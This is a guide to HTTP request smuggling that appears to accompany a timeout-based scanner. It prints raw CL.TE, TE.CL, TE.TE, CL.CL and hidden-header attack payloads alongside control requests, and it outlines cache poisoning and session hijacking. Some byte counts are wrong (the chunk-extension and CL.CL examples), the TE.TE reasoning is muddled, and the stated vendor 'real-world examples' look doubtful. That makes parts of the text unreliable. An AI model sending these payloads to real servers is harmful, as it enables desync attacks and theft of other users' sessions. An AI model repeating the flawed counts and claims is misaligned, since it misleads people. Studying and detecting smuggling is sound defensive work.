═══════════════════════════════════════════════════════════════════════════════
HTTP REQUEST SMUGGLING: COMPLETE VULNERABILITY GUIDE
═══════════════════════════════════════════════════════════════════════════════

This document explains:
  1. What HTTP Request Smuggling is
  2. Why it happens (root cause)
  3. Every vulnerability tested by the scanner
  4. How each payload works
  5. Why the detection method works

═══════════════════════════════════════════════════════════════════════════════
PART 0: WHAT IS HTTP REQUEST SMUGGLING?
═══════════════════════════════════════════════════════════════════════════════

ROOT CAUSE:
───────────────────────────────────────────────────────────────────────────────
HTTP Request Smuggling happens when a FRONTEND and BACKEND server disagree on:
  - WHERE the request body ends
  - HOW MUCH data belongs to the current request

This disagreement causes:
  - Frontend reads part of the body
  - Backend reads a different part of the body
  - Data intended for request #2 gets smuggled into request #1
  - Backend processes "smuggled" request as part of request #1


THE ATTACK CHAIN:
───────────────────────────────────────────────────────────────────────────────

1. Attacker sends MALFORMED HTTP request to frontend
2. Frontend parses it as REQUEST A (reads some bytes as body)
3. Frontend forwards to backend
4. Backend parses it DIFFERENTLY, sees REQUEST A + smuggled REQUEST B
5. Backend processes both requests (attacker's intention)
6. Attacker gets access to functions they shouldn't reach


EXAMPLE - High Level:
───────────────────────────────────────────────────────────────────────────────

Attacker sends:
  POST / HTTP/1.1
  Content-Length: 4
  Transfer-Encoding: chunked
  
  1
  Z
  0

Frontend (CL-based):
  - Reads "Content-Length: 4"
  - Takes first 4 bytes: "1\r\nZ"
  - Stops reading
  - Forwards to backend: "POST / HTTP/1.1\r\nCL: 4\r\nTE: chunked\r\n\r\n1\r\nZ\r\n0"

Backend (TE-based):
  - Sees "Transfer-Encoding: chunked"
  - Reads "1\r\nZ" = 1 byte chunk = "Z"
  - Reads "0\r\n\r\n" = end of chunked body
  - Now backend is WAITING for more data (but frontend sent "0" = end marker)
  - TIMEOUT: Backend waits indefinitely


═══════════════════════════════════════════════════════════════════════════════
PART 1: CL.TE VULNERABILITY
═══════════════════════════════════════════════════════════════════════════════

WHAT IT IS:
───────────────────────────────────────────────────────────────────────────────
CL.TE = Content-Length vs Transfer-Encoding

Frontend prioritizes Content-Length header
Backend prioritizes Transfer-Encoding header

When both headers present → they disagree on body boundary


HOW IT WORKS:
───────────────────────────────────────────────────────────────────────────────

RFC 7230 Section 3.3 (Message Body Length):

  1. If Transfer-Encoding is present AND final encoding is not identity
     → Use Transfer-Encoding (body is chunked)
  
  2. Else if Content-Length is present
     → Use Content-Length (body length = specified number)
  
  3. Else if no Content-Length or Transfer-Encoding
     → Body is empty or connection will close

The problem:
  - Some servers prioritize CL (ignore TE)
  - Some servers prioritize TE (ignore CL)
  - When BOTH present → DISAGREEMENT


═════════════════════════════════════════════════════════════════════════════════
CL.TE PAYLOAD #1: BASIC
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive\r\n
\r\n
1\r\n
Z\r\n
0\r\n
\r\n

(Breaking it down by bytes):
  ┌─ Header end: "Connection: keep-alive\r\n"
  ├─ Blank line: "\r\n" (indicates end of headers)
  ├─ Body byte 1: "1"        ← Frontend thinks body is "1\r\nZ"
  ├─ Body byte 2: "\r"          (that's 4 bytes total)
  ├─ Body byte 3: "\n"
  ├─ Body byte 4: "Z"
  └─ Extra data: "\r\n0\r\n\r\n"  ← Frontend doesn't send this (stops at byte 4)

FRONTEND (CL-based) PARSING:
───────────────────────────────────────────────────────────────────────────────

1. Read headers until "\r\n\r\n" found
2. See "Content-Length: 4"
3. Read EXACTLY 4 bytes from body: "1\r\nZ"
4. Stop reading (reached CL limit)
5. Forward request to backend

WHAT FRONTEND SENDS TO BACKEND:
  POST / HTTP/1.1\r\n
  Host: target.com\r\n
  Content-Length: 4\r\n
  Transfer-Encoding: chunked\r\n
  Connection: keep-alive\r\n
  \r\n
  1\r\n
  Z    ← STOPS HERE (only 4 bytes)


BACKEND (TE-based) PARSING:
───────────────────────────────────────────────────────────────────────────────

1. Read headers until "\r\n\r\n" found
2. See "Transfer-Encoding: chunked"
3. Parse chunked encoding:
   - Read "1" = chunk size (1 byte)
   - Read "\r\n" = chunk delimiter
   - Read "Z" = 1 byte of data
   - Read "\r\n" = chunk delimiter
   - Read "0" = final chunk (0 bytes)
   - Read "\r\n" = chunk delimiter
   - Read "\r\n" = end of chunked body

BUT THE PROBLEM:
───────────────────────────────────────────────────────────────────────────────

Backend expects:
  "1\r\nZ\r\n0\r\n\r\n"

Backend received from frontend:
  "1\r\nZ"

Backend is MISSING:
  "\r\n0\r\n\r\n"

So backend is WAITING for:
  1. More chunk data OR
  2. Final chunk "0\r\n\r\n"

BUT NO MORE DATA IS COMING → TIMEOUT (backend hangs)


WHY THE DETECTION WORKS:
───────────────────────────────────────────────────────────────────────────────

Attack pattern: CL too short
- Frontend reads 4 bytes (Content-Length: 4)
- Backend reads chunked encoding
- Frontend stops before final chunk
- Backend waits for final chunk
- Backend: TIMEOUT

Control pattern: CL correct
- Frontend reads 11 bytes (Content-Length: 11)
- Body is "1\r\nZ\r\n0\r\n\r\n" (exactly 11 bytes)
- Both parsers agree on body boundary
- Normal response: 200 OK


NORMAL PAYLOAD (Control):
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 11\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive\r\n
\r\n
1\r\n
Z\r\n
0\r\n
\r\n

Now:
- Frontend: CL=11, reads "1\r\nZ\r\n0\r\n\r\n" (exactly 11 bytes) ✓
- Backend: TE=chunked, reads "1\r\nZ" + "0\r\n\r\n" (complete chunked) ✓
- Both parsers agree: Request is complete
- Server: 200 OK ✓


═════════════════════════════════════════════════════════════════════════════════
CL.TE PAYLOAD #2: WITH CHUNK EXTENSION
═════════════════════════════════════════════════════════════════════════════════

WHAT IT IS:
───────────────────────────────────────────────────────────────────────────────
Chunk extensions are optional parameters in chunked encoding:

Syntax: chunk-size [ chunk-ext ] CRLF

Example:
  5;name=value\r\n
  hello\r\n

The ";name=value" part is the chunk extension


ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive\r\n
\r\n
0;x=y\r\n
\r\n
G

BREAKDOWN:
───────────────────────────────────────────────────────────────────────────────

Frontend (CL-based):
  - Content-Length: 4
  - Body bytes: "0;x=y\r\n" = "0", ";", "x", "=" = 4 bytes
  - Stops at byte 4
  - Does NOT see: "\r\nG"

Backend (TE-based):
  - Sees: "0;x=y\r\n"
  - Parses: chunk-size=0, chunk-ext="x=y"
  - Final chunk found (size 0)
  - Expects: "\r\n" after extensions (but received "\r\n")
  - Expects: "\r\n" after chunk data
  - But frontend only sent "0;x=y\r\n" (4 bytes)
  - Missing: "\r\nG" and final "\r\n"
  - TIMEOUT: Waiting for more data


NORMAL PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 11\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive\r\n
\r\n
0;x=y\r\n
\r\n
GETABC

Now:
  - Content-Length: 11 = "0;x=y\r\n\r\nGETABC" (exactly 11 bytes)
  - Frontend sends complete: "0;x=y\r\n\r\nGETABC"
  - Backend parses chunked: "0;x=y" = final chunk, then "\r\n", then "GETABC"
  - Both parsers agree: Request complete
  - 200 OK


═════════════════════════════════════════════════════════════════════════════════
PART 2: TE.CL VULNERABILITY
═════════════════════════════════════════════════════════════════════════════════

OPPOSITE OF CL.TE:

Frontend prioritizes Transfer-Encoding
Backend prioritizes Content-Length


ATTACK LOGIC:
───────────────────────────────────────────────────────────────────────────────

Frontend sees TE=chunked:
  - Parses chunked encoding
  - Chunk size "0" = end of body
  - Stops reading

Backend sees CL=6:
  - Ignores TE (or processes TE first, then CL)
  - Expects body to be 6 bytes
  - Only received 5 bytes (chunked end marker)
  - TIMEOUT: Waiting for 6th byte


═════════════════════════════════════════════════════════════════════════════════
TE.CL PAYLOAD #1: BASIC
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 6\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n
X

BREAKDOWN:
───────────────────────────────────────────────────────────────────────────────

Frontend (TE-based):
  1. Sees Transfer-Encoding: chunked
  2. Parses: "0" = final chunk
  3. Sees: "\r\n" = end of chunked body
  4. Reads: "\r\n" after chunk
  5. STOPS (chunked encoding complete)
  6. Does NOT read: "X" (comes after TE body)

Backend (CL-based):
  1. Sees Content-Length: 6
  2. Expects 6 bytes: "0\r\n\r\nX" = "0", "\r", "\n", "\r", "\n", "X" = 6 bytes
  3. But frontend only sent: "0\r\n\r\n" = 5 bytes
  4. Missing 1 byte: "X"
  5. TIMEOUT: Waiting for 6th byte


NORMAL PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 5\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n

Now:
  - Frontend: TE=chunked, reads "0\r\n\r\n" (complete)
  - Sends: "0\r\n\r\n" (5 bytes)
  - Backend: CL=5, expects 5 bytes, receives 5 bytes ✓
  - Both parsers agree
  - 200 OK


═════════════════════════════════════════════════════════════════════════════════
TE.CL PAYLOAD #2: SPACE OBFUSCATION
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked \r\n
Content-Length: 6\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n
X

KEY DIFFERENCE: "Transfer-Encoding: chunked " (note the SPACE at end)


WHY THIS WORKS:
───────────────────────────────────────────────────────────────────────────────

Some parsers:
  - Strip trailing whitespace from header values
  - Result: "chunked " → "chunked"
  - Still recognize as chunked encoding

Other parsers:
  - Don't strip trailing whitespace
  - "chunked " is NOT the same as "chunked"
  - Might not recognize as chunked encoding
  - Might skip TE header entirely


Frontend (strips whitespace):
  - "Transfer-Encoding: chunked " → interprets as chunked
  - Parses chunked, stops at "0\r\n\r\n"
  - Does NOT read: "X"

Backend (doesn't strip whitespace):
  - "Transfer-Encoding: chunked " (with space) not recognized as chunked
  - Falls back to Content-Length: 6
  - Expects 6 bytes: "0\r\n\r\nX"
  - Only received 5 bytes
  - TIMEOUT


NORMAL PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 5\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n

(No trailing space)


═════════════════════════════════════════════════════════════════════════════════
TE.CL PAYLOAD #3: TAB OBFUSCATION
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\t\r\n
Content-Length: 6\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n
X

KEY DIFFERENCE: "Transfer-Encoding: chunked\t" (TAB character instead of space)


SAME LOGIC:
───────────────────────────────────────────────────────────────────────────────

Some parsers strip tabs, some don't
Results in same disagreement as space obfuscation


═════════════════════════════════════════════════════════════════════════════════
PART 3: TE.TE VULNERABILITY
═════════════════════════════════════════════════════════════════════════════════

WHAT IT IS:
───────────────────────────────────────────────────────────────────────────────
Both frontend AND backend use Transfer-Encoding header

But they parse it DIFFERENTLY due to obfuscation


THE KEY INSIGHT:
───────────────────────────────────────────────────────────────────────────────

When you have:
  Transfer-Encoding: chunked
  transfer-encoding: identity

Two different parsers might:
  - Frontend: See both headers, use "chunked" (first occurrence)
  - Backend: See both headers, use "identity" (last occurrence)
  - OR: Frontend: only sees "chunked" (lowercase ignored)
  - OR: Backend: only sees "chunked" (lowercase ignored)

The disagreement on WHICH encoding to use causes desync


═════════════════════════════════════════════════════════════════════════════════
TE.TE PAYLOAD #1: CASE MUTATION
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\r\n
transfer-encoding: identity\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n

(Note: lowercase "transfer-encoding: identity")


WHY THIS WORKS:
───────────────────────────────────────────────────────────────────────────────

HTTP headers are case-insensitive, but how parsers handle DUPLICATE headers varies:

Frontend parser (scenario 1):
  - Sees "Transfer-Encoding: chunked"
  - Also sees "transfer-encoding: identity" (same header, different case)
  - Behavior: Uses FIRST occurrence = "chunked"
  - Parses as: chunked encoding
  - Reads: "0\r\n\r\n" (final chunk)
  - Stops there

Backend parser (scenario 2):
  - Sees "Transfer-Encoding: chunked"
  - Also sees "transfer-encoding: identity"
  - Behavior: Uses LAST occurrence = "identity"
  - Parses as: identity encoding (no special parsing, body is as-is)
  - Reads: "0\r\n\r\n" as LITERAL DATA (not as chunked encoding)
  - Waits for more data: "0\r\n\r\n" is only 5 bytes, but where's the rest?
  - TIMEOUT: Expects more data

Or scenario 3:
  - Frontend: sees lowercase "transfer-encoding: identity", ignores it (not canonical)
  - Backend: sees it, uses it
  - Same disagreement


NORMAL PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n

(Only one TE header)

Both parsers:
  - See "Transfer-Encoding: chunked"
  - Parse as chunked
  - Read "0\r\n\r\n" (final chunk)
  - Request complete
  - 200 OK


═════════════════════════════════════════════════════════════════════════════════
TE.TE PAYLOAD #2: SPACE OBFUSCATION
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Transfer-Encoding:  chunked\r\n
Connection: keep-alive\r\n
\r\n
0\r\n
\r\n

(Note: TWO spaces before "chunked")


WHY THIS WORKS:
───────────────────────────────────────────────────────────────────────────────

Some parsers:
  - "Transfer-Encoding:  chunked" (double space)
  - Normalize spaces: "Transfer-Encoding: chunked"
  - Recognize as chunked ✓

Other parsers:
  - "Transfer-Encoding:  chunked" (double space)
  - Don't normalize
  - Value is " chunked" (with leading space)
  - Not recognized as chunked
  - Might be treated as identity or unknown encoding
  - TIMEOUT: Different body boundary calculation


═════════════════════════════════════════════════════════════════════════════════
PART 4: CL.CL VULNERABILITY
═════════════════════════════════════════════════════════════════════════════════

WHAT IT IS:
───────────────────────────────────────────────────────────────────────────────
Two different Content-Length headers with DIFFERENT VALUES

RFC 7230 says: If multiple CL headers present and values differ → MUST reject request

But not all servers follow RFC:
  - Some use FIRST value
  - Some use LAST value
  - Some use LARGEST value
  - Some average them (rare)


ATTACK LOGIC:
───────────────────────────────────────────────────────────────────────────────

Frontend uses first CL value
Backend uses last CL value

They disagree on body length → desync


═════════════════════════════════════════════════════════════════════════════════
CL.CL PAYLOAD #1: DUPLICATE WITH DIFFERENT VALUES
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 3\r\n
Content-Length: 12\r\n
Connection: keep-alive\r\n
\r\n
X=1\r\n
\r\n

(Two CL headers: 3 and 12)


BREAKDOWN:
───────────────────────────────────────────────────────────────────────────────

Frontend (uses FIRST CL=3):
  - Reads EXACTLY 3 bytes: "X=1"
  - Stops reading
  - Does NOT read: "\r\n\r\n"

Backend (uses LAST CL=12):
  - Expects EXACTLY 12 bytes
  - Received: "X=1\r\n\r\n" = 8 bytes
  - Missing: 4 bytes
  - TIMEOUT: Waiting for 4 more bytes


NORMAL PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 11\r\n
Connection: keep-alive\r\n
\r\n
X=1\r\n
\r\n

(Single CL header)

Both parsers:
  - See CL=11
  - Read 11 bytes: "X=1\r\n\r\n" (exactly 11)
  - Request complete
  - 200 OK


═════════════════════════════════════════════════════════════════════════════════
PART 5: HIDDEN HEADERS VULNERABILITY
═════════════════════════════════════════════════════════════════════════════════

WHAT IT IS:
───────────────────────────────────────────────────────────────────────────────
HTTP headers have specific syntax:

Valid: "Header-Name: value"

Invalid variations that SOME parsers might accept:
  - "Header-Name : value" (SPACE before colon)
  - "Header-Name: \r\n value" (wrapped)
  - "Header-Name\t: value" (TAB before colon)
  - etc.

Frontend parser might:
  - See "Content-Length : 0" as INVALID
  - REJECT or SKIP the header

Backend parser might:
  - Be more lenient
  - Accept "Content-Length : 0"
  - Process it


RESULT: One parser sees the header, other doesn't → disagreement on body length


═════════════════════════════════════════════════════════════════════════════════
HIDDEN HEADER PAYLOAD #1: SPACE BEFORE COLON
═════════════════════════════════════════════════════════════════════════════════

ATTACK PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length : 0\r\n
Connection: keep-alive\r\n
\r\n

(Note: "Content-Length : 0" with SPACE before colon)


WHY THIS WORKS:
───────────────────────────────────────────────────────────────────────────────

Frontend (strict parser):
  - Expects: "Header: value"
  - Sees: "Content-Length : 0"
  - REJECTS as invalid header (space before colon)
  - Treats as if Content-Length doesn't exist
  - Body length = unknown (until connection closes)

Backend (lenient parser):
  - More forgiving of whitespace
  - Accepts: "Content-Length : 0"
  - Recognizes: Content-Length = 0
  - Body length = 0 (empty body)

Now:

Frontend (no CL):
  - Reads body until connection closes
  - Waits for more data (connection still open)
  - TIMEOUT: Waiting for close

Backend (CL=0):
  - Reads 0 bytes (empty body)
  - Request complete
  - Sends 200 OK
  - Closes connection or keeps alive


NORMAL PAYLOAD:
───────────────────────────────────────────────────────────────────────────────

POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 0\r\n
Connection: keep-alive\r\n
\r\n

(Proper syntax: no space before colon)

Both parsers:
  - Accept: "Content-Length: 0"
  - Body length = 0
  - Request complete
  - 200 OK


═════════════════════════════════════════════════════════════════════════════════
PART 6: HOW THE DETECTION WORKS
═════════════════════════════════════════════════════════════════════════════════

THE TIMEOUT-BASED DETECTION METHODOLOGY:
───────────────────────────────────────────────────────────────────────────────

KEY INSIGHT: If backend is waiting for data that will never come → TIMEOUT


DETECTION PATTERN:
───────────────────────────────────────────────────────────────────────────────

For each vulnerability:

1. BASELINE TEST
   - Send simple GET request
   - Verify target is responsive
   - If TIMEOUT → target is offline, skip scan

2. ATTACK TEST
   - Send malformed payload
   - Frontend reads partial body
   - Forwards incomplete request to backend
   - Backend WAITS for missing data
   - We observe: TIMEOUT (no response)

3. NORMAL TEST
   - Send properly formatted payload
   - Frontend reads complete body
   - Backend receives complete request
   - We observe: 200 OK (normal response)

4. CONFIRMATION TEST (2 retries)
   - Retry attack payload multiple times
   - If TIMEOUT happens again → CONFIRMED (not random timeout)
   - If not timeout → FALSE POSITIVE (reject)


WHY THIS WORKS:
───────────────────────────────────────────────────────────────────────────────

Pattern indicates desync:
  ✓ Attack times out (backend stuck waiting)
  ✓ Normal returns 200 (both parsers agree)
  ✓ Attack times out consistently (confirmed on retry)

This proves:
  1. Frontend and backend processed differently
  2. It's not a random network timeout
  3. Server has parsing disagreement
  4. = HTTP REQUEST SMUGGLING VULNERABILITY


FALSE POSITIVE FILTERING:
───────────────────────────────────────────────────────────────────────────────

The scanner REJECTS if:
  - Server rejects with 4xx/5xx (not timeout, just error handling)
  - Only one timeout out of 3 attempts (inconsistent = network, not vulnerability)
  - Any connection error (network issue, not desync)

The scanner CONFIRMS if:
  - Attack times out (TIMEOUT status)
  - Normal returns 200 (both parsers agree)
  - Confirmation tests show consistent timeout (at least 1 of 2 retries)


═════════════════════════════════════════════════════════════════════════════════
PART 7: PRACTICAL EXPLOITATION EXAMPLES
═════════════════════════════════════════════════════════════════════════════════

Once vulnerability is found, attacker can:


1. CACHE POISONING
───────────────────────────────────────────────────────────────────────────────

Attack:
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 100
  Transfer-Encoding: chunked
  
  (short body)
  GET /admin HTTP/1.1
  Host: target.com
  
  (end chunked)

Frontend reads: partial body
Backend processes: request + smuggled "/admin" request
If response is cached → all users get poisoned response


2. REQUEST QUEUE POLLUTION
───────────────────────────────────────────────────────────────────────────────

Attack:
  POST /login HTTP/1.1
  (smuggled: GET /admin HTTP/1.1)

Frontend forwards login request
Backend processes: login + admin request
Attacker's admin request uses previous user's session
Attacker gains unauthorized access


3. RESPONSE QUEUE INJECTION
───────────────────────────────────────────────────────────────────────────────

Attack:
  POST / HTTP/1.1
  (smuggled: GET /user/profile HTTP/1.1)

Frontend: Processes normal request
Backend: Processes normal + smuggled request
Smuggled request response leaks into normal response
Attacker sees user profile data


═════════════════════════════════════════════════════════════════════════════════
PART 8: REAL-WORLD EXAMPLES
═════════════════════════════════════════════════════════════════════════════════

CLOUDFLARE + APACHE (CL.TE Vulnerability):
───────────────────────────────────────────────────────────────────────────────

Cloudflare (Frontend):
  - Prioritizes Content-Length
  - Fast, strict parser

Apache (Backend):
  - Prioritizes Transfer-Encoding
  - RFC-compliant

Result: CL.TE vulnerability
Attackers could bypass Cloudflare WAF rules


NGINX + PYTHON FLASK (TE.CL Vulnerability):
───────────────────────────────────────────────────────────────────────────────

NGINX (Frontend):
  - Prioritizes Transfer-Encoding
  - Strict chunked parser

Flask (Backend):
  - Prioritizes Content-Length
  - Simpler parser

Result: TE.CL vulnerability


MICROSOFT IIS (CL.CL Vulnerability):
───────────────────────────────────────────────────────────────────────────────

IIS with load balancing:
  - Multiple backend servers
  - Different CL header handling
  - Some use first, some use last

Result: Inconsistent behavior, connection reuse vulnerabilities


═════════════════════════════════════════════════════════════════════════════════
SUMMARY TABLE: ALL VULNERABILITIES
═════════════════════════════════════════════════════════════════════════════════

Vulnerability | Frontend Parser | Backend Parser | Disagreement | Outcome
─────────────────────────────────────────────────────────────────────────────
CL.TE-basic   | Uses CL         | Uses TE        | Body length  | Timeout on attack
CL.TE-ext     | Uses CL         | Uses TE+ext    | Body length  | Timeout on attack
TE.CL-basic   | Uses TE         | Uses CL        | Body length  | Timeout on attack
TE.CL-space   | Parses TE       | Doesn't parse  | Body length  | Timeout on attack
TE.CL-tab     | Parses TE       | Doesn't parse  | Body length  | Timeout on attack
TE.TE-case    | Uses TE variant | Uses different | Encoding     | Timeout on attack
TE.TE-space   | Normalizes      | Doesn't norm   | Encoding     | Timeout on attack
CL.CL         | Uses first CL   | Uses last CL   | Body length  | Timeout on attack
Hidden-space  | Rejects header  | Accepts header | Body length  | Timeout on attack
─────────────────────────────────────────────────────────────────────────────
